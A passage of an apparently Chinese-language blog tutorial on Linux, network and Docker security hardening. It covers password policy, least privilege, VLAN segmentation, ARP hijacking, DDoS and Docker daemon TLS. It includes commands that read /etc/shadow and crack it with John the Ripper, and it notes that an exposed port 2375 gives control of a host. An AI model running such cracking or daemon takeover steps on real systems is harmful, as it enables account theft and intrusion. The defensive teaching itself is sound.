    <content type="html"><![CDATA[<p>在开发一个应用的过程中，需要涉及代码、操作系统、网络和数据库等多个方面。所以，只是了解代码安全肯定是不够的，我们还需要了解常见的基础环境和工具中的安全机制，学会通过正确地配置这些安全机制，来提升安全保障。</p><a id="more"></a><h2 id="Linux-系统安全"><a href="#Linux-系统安全" class="headerlink" title="Linux 系统安全"></a>Linux 系统安全</h2><p>谈到 Linux，我相信你每天都在使用 Linux 进行各种开发和运维操作。但是，大多数情况下，公司不会给每一个员工分配专有的 Linux 服务器，而是多个开发和运维共用一台 Linux 服务器。那么，其他员工在使用 Linux 服务器的时候，会不会对我们自己的数据和进程产生影响呢？另外，我在 Web 安全中讲过，黑客可以通过很多漏洞控制 Linux 服务器，那我们又该如何避免和控制黑客的破坏呢？</p><h3 id="如何理解-Linux-中的安全模型？"><a href="#如何理解-Linux-中的安全模型？" class="headerlink" title="如何理解 Linux 中的安全模型？"></a>如何理解 Linux 中的安全模型？</h3><p>我们先来看一下 Linux 的构成，Linux 可以分为内核层和用户层。用户层通过内核层提供的操作接口来执行各类任务。</p><p>内核层提供的权限划分、进程隔离和内存保护的安全功能，是用户层的安全基础。一旦内核安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存了。这个时候，任何用户层的安全措施都是没有意义的。</p><p>既然 Linux 的内核安全这么重要，那我们是不是要在防护上付出大量的精力呢？事实上，正如我们不需要在开发应用时（尤其是使用 Java 这类相对高层的语言时），过多地关心操作系统相关的内容一样，我们在考虑 Linux 安全时，也不需要过多地考虑内核的安全，更多的是要考虑用户层的安全。所以，对于 Linux 内核层的安全，我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新就足够了。</p><p>既然，使用最多的是用户层，那我们就来看一下，用户层的操作都有什么。</p><p>在 Linux 中，用户层的所有操作，都可以抽象为“主体 -&gt; 请求 -&gt; 客体”这么一个流程。比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。</p><p><img src="/images/security/security-linux/1.jpg" alt="1"></p><p>在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。Linux 用户层则需要确保权限的正确配置，这也是如何保证多人安全地共用服务器的关键。</p><h3 id="黄金法则是如何在-Linux-系统中应用的？"><a href="#黄金法则是如何在-Linux-系统中应用的？" class="headerlink" title="黄金法则是如何在 Linux 系统中应用的？"></a>黄金法则是如何在 Linux 系统中应用的？</h3><p>现在我们知道了，Linux 系统安全防护的核心是正确配置用户层权限。那接下来，我们就从黄金法则的认证、授权和审计这三个方面来看一下，<br>Linux 系统是如何进行权限配置的，这其中，又有哪些值得我们重点关注的安全选项。</p><h4 id="Linux-中的认证机制"><a href="#Linux-中的认证机制" class="headerlink" title="Linux 中的认证机制"></a>Linux 中的认证机制</h4><p>Linux 系统是一个支持多用户的操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有两个比较关键的文件：/etc/passwd和/etc/shadow。</p><p>我们知道，在 Linux 中，/etc/passwd是全局可读的，不具备保密性。因此，/etc/passwd不会直接存储密码，而是用 x 来进行占位。那实际的用户密码信息，就会存储到仅 ROOT 可读的/etc/shadow中。</p><p>在/etc/shadow中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过 Chage 命令来对密码管理策略进行修改，比如，通过下面的 Chage 命令，就可以强制 Test 用户在 60 天内必须对密码进行修改。通过这样的方式，就可以降低密码泄露的可能性了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chage -M 60 <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>因为认证这个功能是由 Linux 内核来提供的，所以在用户层，我们需要关心的安全问题，就是弱密码导致的身份信息泄露。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过John the Ripper，使用已知的弱密码库，来对 Linux 中的弱密码进行检测。下面的命令，就是使用 John the Ripper 检测弱密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; mypasswd</span><br><span class="line">john mypasswd</span><br><span class="line">john --show mypassw</span><br></pre></td></tr></table></figure><h4 id="Linux-中的授权机制"><a href="#Linux-中的授权机制" class="headerlink" title="Linux 中的授权机制"></a>Linux 中的授权机制</h4><p>在“黄金法则”中，认证只是第一步，它提供了一个可信的身份标识。有了这个身份标识之后，就需要通过授权来限制用户能够发起的请求了。</p><p>在 Linux 中，客体只有文件和目录两种，针对这两种类型的客体，Linux 都定义了读、写和执行这三种权限。你可以通过我总结的这张对比表格看<br>到，文件和目录在这三种权限上的区别。</p><p><img src="/images/security/security-linux/2.jpg" alt="2"></p><p>除此之外，Linux 还提供了一些额外的权限标签，来进行更细粒度地权限控制。</p><p>比如，Linux 提供了文件属性的概念，来对文件设置更多的保护。通过chattr +i /etc/passwd可以防止文件被任何用户修改。</p><p>Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如chmod +t /tmp可以阻止删除 /tmp 目录下其他用户的文件。</p><p>这些都是 Linux 在授权中的自我保护机制，那我们能在这个过程中进行怎样的防护呢？</p><p>前面，我们一直在强调，Linux 系统面临的安全威胁其实就是权限问题。也就是说，要么就是敏感文件的权限配置不当，导致这些文件可以被额外的用户访问或执行；要么就是应用存在漏洞或密码泄露，导致低权限用户可以获得更高的权限。</p><p><strong>要解决权限问题，我们就要实践最小权限原则。</strong></p><p>我们先来看一个 Linux 系统安全中最普遍的问题：滥用 ROOT。很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境，这样我们就不需要在每次操作的时候，通过 sudo 来临时提升至 ROOT 权限。</p><p>但是，这里你需要注意一点，在 ROOT 的 Shell 环境中启动的所有进程也都具备 ROOT 权限。如果启动的是一个立即返回的进程，如 CAT，不会有太多问题，但如果是一个长期运行的进程，就很容易产生权限的滥用。</p><p>比如，当你以 ROOT 的身份启动 Redis 或者 MySQL 等存储工具时，如果这时有其他用户连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。</p><p>因此，在运行任何长驻进程时，我们都需要谨记“最小权限”原则。也就是说，我们可以根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。</p><p>因此，“最小权限”原则在 Linux 系统中的应用是非常重要的。那你可能会问了，Linux 系统中的操作那么多，每个操作都需要自己进行权限配置吗？当然不是，我们常常会使用一些已知的工具，来实现“最小权限”启动长驻进程的功能，而你需要做的，就是正确地启动或者配置这些工具。</p><p>比如说，我们可以通过 mysqld 启动 MySQL 服务，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT 下建立守护进程。具体的效果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root     297353  0.0  0.0 115432  1360 ?        S    Aug12   0:00 /bin/sh /usr/<span class="built_in">local</span>/mysql/bin/mysqld_safe --datadir=/var/lib/mysql --pid-file=/var/lib/mysql/mysql.pid</span><br><span class="line">mysql    297553 31.3  4.3 11282756 5729572 ?    Sl   Aug12 22593:40 /usr/<span class="built_in">local</span>/mysql/bin/mysqld --basedir=/usr</span><br></pre></td></tr></table></figure><p>类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。具体的效果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root       7083  0.0  0.0  61032  5324 ?        Ss   Aug12   0:01 nginx: master process nginx</span><br><span class="line">nobody   331122  0.0  0.0  90768 31776 ?        S    11:44   0:00 nginx: worker process</span><br><span class="line">nobody   331123  0.0  0.0  90768 32720 ?        S    11:44   0:00 nginx: worker process</span><br><span class="line">nobody   331124  0.0  0.0  90768 31776 ?        S    11:44   0:00 nginx: worker process</span><br></pre></td></tr></table></figure><p>当然，也有一些工具不提供这类最小权限切换的功能，比如，在直接执行redis-server启动 Redis 的时候，就需要我们自己来对用户身份进行切换。那用户身份切换怎么做呢？</p><p>我们首先来看 Nginx 的例子，在启动 Nginx 的时候，Linux 提供了 nobody 这么一个用户的身份。实际上，任何人进入 Linux 系统首先获得的用户身份就是 nobody，然后再从 nobody 进行登录，切换到其他正常用户身份上。</p><p>因此，nobody 通常拥有整个操作系统中最小的权限。所以，对于不提供最小权限切换功能的工具，我们就可以使用 nobody 的用户身份，来进行主动切换了。</p><p>在执行redis-server启动 Redis 的时候，我们就可以通过以下命令，以 nobody 的身份执行redis-server了（前提是，我们需要对日志和 PID 等目录进行适当配置，确保能够以 nobody 身份写入）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/redis-server nobody</span><br></pre></td></tr></table></figure><p>这样一来，我们就能通过“最小权限”原则，提升 Linux 系统授权的安全性了。</p><h4 id="Linux-中的审计机制"><a href="#Linux-中的审计机制" class="headerlink" title="Linux 中的审计机制"></a>Linux 中的审计机制</h4><p>在 Linux 系统中，系统的日志信息通常存储在 /var/log 目录下，部分应用程序也会把相关日志记录到这个目录中。系统日志主要分为 3 类，用户登录日志、特殊事件日志和进程日志。</p><p>用户登录日志主要是/var/log/wtmp和/var/run/utmp，用来保存用户登录相关的信息。用户登录日志本身为二进制文件，我们无法直接通过文本方式查看，但是可以配合who/users/ac/last/lastlog这样的命令来获取。</p><p>特殊事件日志主要包括/var/log/secure和/var/log/message。其中，/var/log/secure主要记录认证和授权相关的记录，如果有人试图爆破 SSH，我们就可以从这个日志中观察出来。/var/log/message由 syslogd 来维护，syslogd 这个守护进程提供了一个记录特殊事件和消息的标准机制，其他应用可以通过这个守护进程来报告特殊的事件。</p><p>进程日志：当通过 accton 来进行系统进程管理时，会生成记录用户执行命令的 pacct 文件。</p><p>默认情况下，Linux 会通过 logrotate 对日志执行相应的保留策略（比如日志切割和旧日志删除等）。通过配置/etc/logrotate.conf可以对不同日志的保留策略进行修改。</p><p>那如何对日志进行监控呢？这里，我向你推荐 2 种常见的日志分析工具 ELK 和 Zabbix，你可以利用这些工具来监控 Linux 的安全日志。也就是说，我们可以通过在这些分析平台配置恰当的规则（如 SSH 登录尝试失败 3 次以上），来及时发现黑客的部分入侵尝试，迅速产生报警。然后，我们就可以针对具体的问题，进行人工复查了。</p><h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><p>你平时使用手机连接无线网络的时候，一定看到过这样的安全提示：不要连接陌生的 Wi-Fi。也一定看过很多这样的报道：某先生 / 女士因为使用了陌生的 Wi-Fi，信息遭到泄露，不仅账号被盗用，还造成了经济损失。</p><p>你可能要说了，只要我避免连入陌生的 Wi-Fi，前面说的攻击就基本不会发生了。但是，在工作中，员工和服务器通常接入的也是同一个网络，那员工是不是就可以任意地捕获服务器中的流量呢？其他人是不是也能轻易地窃取员工信息呢？内网又是怎么保证安全性的呢？</p><h3 id="内网中的“最小权限原则”"><a href="#内网中的“最小权限原则”" class="headerlink" title="内网中的“最小权限原则”"></a>内网中的“最小权限原则”</h3><p>我们先来看，内网是怎么保证安全性的。前面我们说过，在 Linux 系统中，我们可以使用“最小权限原则”来限制黑客的行动能力。而“最小权限原则”，在内网中同样适用。为了保证安全性，我们要限制黑客进入内网后的权限范围，也就是说，就算黑客能够进入内网，我们也只允许它在一个有限的子网内进行访问，而不能任意地访问所有服务。那内网中的“最小权限原则”究竟是怎么实现的呢？</p><p>在内网中，实现“最小权限原则”的核心在于分区和隔离。接下来，我们就一起来看，在公司内网中，分区和隔离具体是怎么实现的。</p><h4 id="对内网进行水平划分"><a href="#对内网进行水平划分" class="headerlink" title="对内网进行水平划分"></a>对内网进行水平划分</h4><p>我们知道，连入内网的人和设备具备不同的“身份”和“权限”。比如，公司正式员工、外包员工和访客等，这些人所使用的内网服务区别很大。因此，我们需要依据不同的“身份”来对网络区域进行隔离，而这就需要用到 VLAN 提供的功能了。</p><p>那什么是 VLAN 呢？在一般情况下，连入同一个交换机的所有设备都在同一个网络中，两两之间能够相互访问。为了阻止这些设备相互访问，我们可以在交换机上设定，在不改变物理连接的情况下，通过交换机的控制将这个网络划分为多个不同的子网，也就是 VLAN（ Virtual Local Area Network，虚拟局域网）。简单来说，VLAN 就是一个交换机创建出来的多个子网。因为隔离的存在，不同 VLAN 的访问请求，会被交换机阻止。</p><p>这样一来，我们就实现了对不同“身份”的人的网络隔离。</p><h4 id="对内网进行垂直划分"><a href="#对内网进行垂直划分" class="headerlink" title="对内网进行垂直划分"></a>对内网进行垂直划分</h4><p>事实上，对不同“身份”的人的网络隔离属于对内网进行水平划分。除此之外，公司也会对内网进行垂直划分。</p><p>最简单的，我们会将公司内网整体保护起来，和外网进行隔离，这种隔离就属于垂直划分。在这种隔离之下，内网可以访问外网的资源，外网却不能够直接访问内网的资源。要实现这种隔离，就需要用到路由器了。路由器会将连入的所有内网设备打包在一起。所以，对外网来说，内网变成了一个整体，也就无法访问到某个具体的设备了。</p><p>在下图中，我简单地展示了一下利用路由器和交换机对内网进行划分的效果：通过路由器划分内网和外网，通过交换机划分正式员工网络和外包员工网络。实际上，你还可以对每一个 VLAN 按照安全等级，进行进一步的垂直和水平划分。</p><p><img src="/images/security/security-linux/3.jpg" alt="3"></p><h3 id="有线网络和无线网络安全"><a href="#有线网络和无线网络安全" class="headerlink" title="有线网络和无线网络安全"></a>有线网络和无线网络安全</h3><p>现在，你应该知道如何在内网中落实“最小权限原则”了。而网络作为一个数据传输的主要通道，保障其中数据的安全性，也是非常重要的。这其中包括两个关键问题。</p><ul><li>如何保障通道中的数据不被窃取？这涉及认证和加密的手段。</li><li>如何保障通道的接收方是可信的？也就是如何避免被“劫持”。</li></ul><p>在工作中，我们最常接触的两种网络就是有线和无线网络，接下来，我就结合前面这两个关键问题，带你探讨一下有线和无线环境中的网络安全。</p><h4 id="无线网络安全"><a href="#无线网络安全" class="headerlink" title="无线网络安全"></a>无线网络安全</h4><p>无线网络你应该非常熟悉，我们在实际工作和生活中到处都需要用到无线网络。在无线网中，个人设备是通过射频技术和无线热点进行连接的。射频无法定向接收，因此，数据都是“广播”出去的。也就是说，只要在设备和热点附近，任何人都能接收到无线网络中的数据。</p><p>为了保证无线网络数据的安全性，我们主要的防护手段，就是使用目前最安全的无线网络协议WPA2。</p><p>但是，WPA2 协议只是用来保护无线网络中数据安全性的。它的连入密钥都是共享的，所以不具备严格意义上的认证功能。而公司需要通过认证知道每一个连入内网的设备的归属，来追踪每一个员工的操作。那无线网络中的认证是怎么做的呢？</p><p>一般的操作是对连入的用户实行“强制门户”。“强制门户”你应该很熟悉，就是当你使用公用密钥连入网络之后，还需要你在网页中再次进行认证。比如，在连入机场网络后，还需要你进行手机号验证。具体的原理就是，用户在连入 Wi-Fi 后，路由器会将用户的 HTTP 请求重定向至认证页面。认证成功后，路由器会记录用户的身份和 MAC，后续路由器就可以根据 MAC 来识别用户身份了。</p><p><img src="/images/security/security-linux/4.jpg" alt="4"></p><p>那“强制门户”在公司内部是怎么应用的呢？一般在连入内网后，员工还需要通过公司邮箱和密码，进行一次额外的验证。这样一来，公司就能够知道连入内网的到底是哪一名员工了。</p><p>说完了无线网络中的认证和加密，我们再看一下“劫持”的问题。在无线网络中，“劫持”的主要方式是，伪造热点。</p><p>伪造热点的实现，主要依赖的就是现在设备的自动连网功能。简单来说，就是只要你的设备曾经连入过某一个热点，设备就会记住这个热点的 ID 和密码，下次如果设备再检测到这个热点 ID，就会尝试自动连接。</p><p>而黑客也可以利用自动连网的功能发起攻击。黑客只需要伪造出来一个相同的热点 ID，就可以诱导用户的设备连入黑客的热点，从而“劫持”流量。避免伪造热点的方法也很简单，就是对办公网络中的未知热点进行扫描。</p><p>所以，总结一下，在无线网的安全中，我们需要关注这三个点：</p><ul><li>是否使用了安全的协议，也就是 WPA2；</li><li>是否有认证技术，也就是强制门户；</li><li>是否有未知的热点出现在办公环境中。</li></ul><h4 id="有线网络安全"><a href="#有线网络安全" class="headerlink" title="有线网络安全"></a>有线网络安全</h4><p>区别于无线网络，有线网络不存在认证和加密的问题。这个很好理解，因为有线网是通过网线来进行物理接入的。换一句话说，只要运维人员给服务器插上了网线，就说明运维人员授权这台服务器接入内网了。而且，一根网线只能将一台设备连入网络，不存在网线共享。所以，不需要考虑加密的问题。因此，我们在有线网络中，主要考虑的问题就是“劫持”。</p><p>所谓“劫持”，其实就是误导服务器将请求发送到黑客的设备上去。在无线网中，服务器实际上是向连接的热点发送请求，因此，我们可以通过伪造热点来进行误导。那在有线网中，服务器又会向哪里发送请求呢？</p><p>在网络协议中，目标地址主要通过 MAC 地址和 IP 地址来确定。MAC 地址和 IP 地址分别是基于ARP 协议和DNS 协议来进行寻址的。因为 ARP 和 DNS 都是早期的网络协议，所以安全性较低。因此黑客可以轻易地发出伪造的 ARP 包和 DNS 包，从而“欺骗”目标设备将数据包发送到黑客的设备上，实现流量“劫持”的功能。</p><p>为了帮助你理解这个过程，我把 ARP“劫持”的过程总结成了一张图。从这张图中，我们能看到，服务器 A 想要向服务器 B 发起请求，但是黑客通过发送伪造的 ARP 包误导 A 说：“10.0.0.2 的 MAC 地址是 3:3:3:3”。因为 ARP 没有进行认证，所以 A 会无条件相信黑客的说法。那么，当 A 想要向 B 发送请求的时候，MAC 地址会设定成黑客的 3:3:3:3，所以请求最终就发送到了黑客的服务器上。DNS“劫持”的原理，和这个比较类似，也是黑客误导服务器，让服务器错认黑客的 IP 为某个域名的 IP。</p><p><img src="/images/security/security-linux/5.jpg" alt="5"></p><h3 id="如何理解-DDoS-攻击？"><a href="#如何理解-DDoS-攻击？" class="headerlink" title="如何理解 DDoS 攻击？"></a>如何理解 DDoS 攻击？</h3><p>最后，我们再来介绍一种常见的内网攻击，DDoS 攻击（Distributed Denial Of Service Attack，分布式拒绝服务攻击）。DDoS 就是黑客由外网向公司服务发起大量的请求，从而打满网络带宽，让内网无法响应用户的正常请求。那么，DDoS 是如何产生的呢？我们又该如何防护呢？</p><p>说到这，我们先了解一下 DoS（Denail f Service，拒绝服务）攻击。知道了 DoS 攻击，DDoS 攻击就很好理解了。</p><p>DoS 攻击主要有两种类型。一种是通过漏洞进行攻击，使得服务或设备因为程序报错而宕机。比如针对 ICMP 协议的“死亡之 PING”，就是因为旧版本的 Windows 系统在处理超长的 ICMP 包时会报错死机。另一种则是通过巨量的垃圾流量挤占网络带宽，使得网络设备无法接收或者发送合法的流量。</p><p>但是，黑客如果直接对目标网络发起 DoS 攻击，很容易就会被溯源出来。所以，黑客会通过大量的“肉鸡”（被黑客远程控制的机器）来向目标网络发起请求，隐藏自己的真实地址。这个过程就是 DDoS。</p><p>这里要补充一点，依靠“肉鸡”代理，黑客不仅可以增加自己被溯源的难度，还可以放大（或者说增强）攻击的效果。比如，当你请求一个网页时，你请求的数据实际上只有一个 URL，但服务器却需要返回给你一整个网页。</p><p>近几年比较流行的基于 Memcache 的 DDoS，就是黑客向“肉鸡”的 Memcache 发送一个十几个字节的 GET 请求，通过在请求参数中进行配置，黑客可以让 Memcache 服务器将返回的结果发送到目标的服务器，而返回的结果能够达到几百 Kb 的数据量，放大倍数达到数万倍。这也是为什么黑客可以依靠几十个“肉鸡”代理，挤占目标网络几十 GB 的带宽。</p><p>DDoS 能对内网造成非常严重的影响，那我们该如何进行防护呢？目前来说，DDoS 基本是不可防的。因为只要你的应用还在正常地提供服务，那就需要接收外网的请求，因此没办法直接拒绝黑客向你发起的请求。哪怕你能够识别出这些恶意的请求，并且拒绝响应，这也只能避免 CPU 被耗尽，而带宽的资源还是会被占用。</p><p>所以，各类云服务厂商提供的 DDoS 解决方案，基本都是依靠带宽扩容来进行保障的。比如，阿里云可能会卖给你一个 40G 的防 DDoS 服务。只要 DDoS 的流量小于 40G，阿里云就会保障你服务的可用性。一旦超过，就会直接关停你的服务避免资源浪费。</p><h2 id="Docker-安全"><a href="#Docker-安全" class="headerlink" title="Docker 安全"></a>Docker 安全</h2><p>我们讲了 Linux 系统安全。但是，当你在和同事讨论 Linux 系统安全的时候，同事表示，公司的服务都是通过 Docker 来进行容器化部署的。开发在操作中，并不会接触实际的 Linux 服务器，所以不会去关注 Linux 安全 。而且，因为容器是隔离的，就算容器被黑客攻击了，也只是容器内部受到影响，对宿主的 Linux 系统和网络都不会产生太大影响。</p><p>事实上，我知道很多人都有这种想法。但是，可以试着思考一下，开发使用了 Docker 就一定安全吗？真的可以不用考虑安全问题了吗？</p><p>以防你对 Doker 还不是很了解，在解决这些问题之前，我先来解释一下这节课会涉及的 3 个概念，帮你扫清概念障碍。</p><ul><li>Docker 服务：Docker 所提供的功能以及在宿主机 Linux 中的 Docker 进程。</li><li>Docker 镜像：通过 Dockerfile 构建出来的 Docker 镜像。</li><li>Docker 容器：实际运行的 Docker 容器，通常来说，一个 Docker 镜像会生成多个 Docker 容器。Docker 容器运行于 Docker 服务之上。</li></ul><h3 id="Docker-服务安全"><a href="#Docker-服务安全" class="headerlink" title="Docker 服务安全"></a>Docker 服务安全</h3><p>我们首先来看 Docker 服务的安全性。Docker 服务本身需要关注的安全性就是：隔离。如果黑客在控制了容器之后，能够成功对宿主机产生影响，就说明黑客突破了 Docker 服务的隔离保护，也就是我们所说的“Docker 逃逸”。</p><p>我们首先来看 Docker 服务的安全性。Docker 服务本身需要关注的安全性就是：隔离。如果黑客在控制了容器之后，能够成功对宿主机产生影响，就说明黑客突破了 Docker 服务的隔离保护，也就是我们所说的“Docker 逃逸”。</p><p><strong>第 1 个是 Namespace 机制。</strong></p><p>我们知道，Docker 之所以广泛流行，是因为它提供了一种轻量化的隔离环境，也就是容器。</p><p>下面，我们重点解释一下“轻量化”和“隔离”这两个词。首先是轻量化。怎么理解轻量化呢？我们可以对比虚拟机来进行理解。虚拟机是自己创造了一个虚拟内核，让这个虚拟内核去和虚拟机的进程进行沟通，然后虚拟内核再和真实的 Linux 内核进行沟通。而 Docker 提供的容器，简化了这个沟通过程，让 Docker 中的进程直接和 Linux 内核进行沟通。</p><p><img src="/images/security/security-linux/6.jpg" alt="6"></p><p>第二个词是隔离。也就是说，Docker 提供的容器环境是和 Linux 内核隔离的。想要实现这种隔离，就需要用到 Namespace 机制了。所以，这里我先给你简单解释一下什么是 Namespace 机制。</p><p>Namespace 是 Linux 提供的一种标签机制，Linux 内核会对不同 Namespace 之间的进程做隔离，避免不同的进程之间互相产生影响。所以，Docker 服务会为每一个 Docker 容器创建一个单独的 Namespace 空间。 这样一来，不同容器之间、容器和系统之间，都是不同的 Namespace，也就实现了隔离。</p><p>这种基于 Namespace 的隔离我一般叫它“伪隔离”。因为通过 Namespace 进行的隔离并不彻底。为啥这么说呢？Docker 容器在隔离的环境中，仍然需要使用一些底层的 Linux 进程和设备支持。比如，你在 Docker 容器中仍然需要使用鼠标、键盘等输入输出设备，那么容器就必须挂载 Linux 系统中的 /sys 来获得对应的驱动和配置信息。也就是说，你在 Docker 中看到的 /sys 目录，实际就是 Linux 系统中的 /sys 目录。类似的，还有一些没有被 Namespace 隔离开的目录和模块，包括以下这些内容：</p><ul><li>部分的进程目录 /proc/…</li><li>内存映像 /dev/mem</li><li>系统设备 /dev/sd*</li><li>Linux 内核模块</li></ul><p>换一句话说，因为容器和宿主机需要共同使用一些服务（比如容器和宿主机使用的是同一个鼠标），所以上面的这些目录和模块，对于容器和宿主机来说，其实是共享的。从理论上来说，如果你在 Docker 容器中修改了这些目录，那么宿主机当中也会同步相应的修改结果。</p><p><strong>第 2 个 Capabilities 机制。</strong></p><p>我们刚刚说了，Namespace 的伪隔离机制让容器和宿主机共享部分目录。那么，这是不是也意味着，Docker 容器可以通过这些目录来影响宿主机，从而实现“Docker 逃逸”呢？为了避免这种情况，Docker 服务使用了 Capabilities 机制，来限制容器的操作。</p><p>Capabilities 提供了更细粒度的授权机制，它定义了主体能够进行的某一类操作。比如，一个 Web 服务需要绑定 80 端口，但 80 端口的绑定是需要 ROOT 权限的。为了防止 ROOT 权限滥用，Docker 会通过 Capabilities，给予这个 Web 服务 net_bind_service 这个权限（允许绑定到小于 1024 的端口）。同样地，Docker 对容器的 ROOT 也加了很多默认的限制，比如：</p><ul><li>拒绝所有的挂载操作；</li><li>拒绝部分文件的操作，比如修改文件所有者；</li><li>拒绝内核模块加载。</li></ul><p>这里有一点需要你注意，Capabilities 对容器可进行操作的限制程度很难把控。这是因为，过松会导致 Docker 容器影响宿主机系统，让 Docker 隔离失效；过严会让容器和容器内的服务功能受限，无法正常运行。</p><p>所以，在默认情况下，Docker 会采用白名单机制（白名单列表你可以在 Docker 源码中查看）进行限制，即只允许 Docker 容器拥有几个默认的能力。那有了白名单限制，即使黑客成功拿到了容器中的 ROOT 权限，能够造成的影响也相对较小。所以我们常说，“Docker 逃逸”是一件不容易的事情。</p><p><strong>第 3 个是 CGroups 机制。</strong></p><p>好了，现在你应该知道 Docker 服务本身是如何防止“Docker 逃逸”的了。作为一个容器，Docker 显然不能过多地占用宿主机资源，不然对宿主机和自身的可用性都会产生影响。那 Docker 是如何实现资源限制的呢？</p><p>Docker 服务可以利用 CGroups 机制来实现对容器中内存、CPU 和 IO 等的限制。比如，通过下面的命令，我们就可以限制 Docker 容器只使用 2 个 CPU 和 100MB 的内存来运行了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --cpus=2 --memory=<span class="string">"100m"</span> ubuntu:latest /bin/bash</span><br></pre></td></tr></table></figure><p>所以，当一个宿主机中运行了多个 Docker 容器的时候，我们可以通过 CGroups，给每一个容器弹性地分配 CPU 资源。同样地，这个限制既不能过松，过松会导致某一个 Docker 容器耗尽宿主机资源，也不能过严，过严会使得容器内的服务得不到足够的资源支持。这都需要我们自己经过慎重考量来进行配置，没有默认的安全机制可以辅助我们。</p><p>现在，你应该已经了解 Docker 服务中的 3 个主要机制了。这里，我把这 3 个主要机制的特点总结成了一张表格，帮助你加深理解。</p><p><img src="/images/security/security-linux/7.jpg" alt="7"></p><h3 id="Docker-守护进程"><a href="#Docker-守护进程" class="headerlink" title="Docker 守护进程"></a>Docker 守护进程</h3><p>想要运行 Docker 镜像，就必须先启动 Docker 的 Daemon 守护进程。而启动这个守护进程需要 ROOT 权限。因此，守护进程本身如果出现漏洞，就会给黑客提供一个权限提升的入口。那通过这个守护进程，黑客能进行哪些操作呢？</p><p>首先，作为守护进程，Daemon 具备操控 Docker 容器的全部权限。这也就意味着，黑客可以任意地上线和下线容器、运行黑客自己的镜像、篡改已有镜像的配置等。这么说可能不够直观，我来详细解释一下。黑客通过守护进程，可以将宿主机的根目录共享到镜像中，这样一来，镜像就可以对宿主机的目录进行任意地修改了。另外，除了影响正常的线上容器，黑客还能够通过简单的 docker exec 命令获取容器环境中的 Shell，从而执行任意命令了。</p><p>那么，黑客怎么才能控制 Daemon 守护进程呢？最简单的方法当然是直接进入宿主机，通过 Docker 命令进行交互。但如果黑客已经进入宿主机，还去操控容器，就是多此一举了。所以，黑客主要是通过远程 API，来对 Docker 守护进程发起攻击。</p><p>守护进程提供的 API 接口，是为了方便用户去做一些自动化的工具，来操控 Docker 容器。而在默认情况下，这个 API 接口不需要进行认证。你可以尝试探测一下，你的公司内外网中，是否存在开放的 2375 端口（守护进程 API 默认监听的端口）。如果存在的话，那么你基本上就能够控制这台服务器的 Docker 守护进程了。</p><p>为了避免这种无认证的情况发生，Docker 提供了证书的方式来进行认证。开启 API 接口的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=0.0.0.0:2376</span><br></pre></td></tr></table></figure><p>通过以上命令，我们就能够在宿主机开启远程 API 接口。在客户端中，只需要提供相应的证书信息，就能够完成经过认证的 API 接口调用了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://127.0.0.1:2376/images/json --cert cert.pem --key key.pem --cacert ca.pem</span><br></pre></td></tr></table></figure><p>那通过这样的配置，我们就能解决了 API 接口的认证问题，也就提升了 Docker 守护进程的安全性。</p><h3 id="Docker-镜像安全"><a href="#Docker-镜像安全" class="headerlink" title="Docker 镜像安全"></a>Docker 镜像安全</h3><p>了解了 Docker 守护进程的安全风险和防护方法之后，我们再来看一下 Docker 镜像的安全。</p><p>对于 Docker 镜像来说，它本身就是一个模拟的操作系统，自然也会存在操作系统中的各类安全威胁和漏洞。但是，由于一个 Docker 镜像，一般只会运行某一种服务，也就相当于一个操作系统中只有一个用户。因此，Docker 镜像面临的安全威胁也会小很多。</p><p>接下来，我就为你详细讲解两种保证 Docker 镜像安全的方式，分别是“使用最精简的镜像”和“最小权限原则”。</p><h4 id="使用最精简的镜像"><a href="#使用最精简的镜像" class="headerlink" title="使用最精简的镜像"></a>使用最精简的镜像</h4><p>前面我们讲了 Docker 镜像的概念，我们知道，Docker 镜像是通过 Dockerfile 来构建的。而 Dockerfile 构建的第一句是 FROM ***。以 Node.js 的环境为例，你的基础镜像可能是 node，那么 Dockerfile 的第一行应该是 FROM node。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 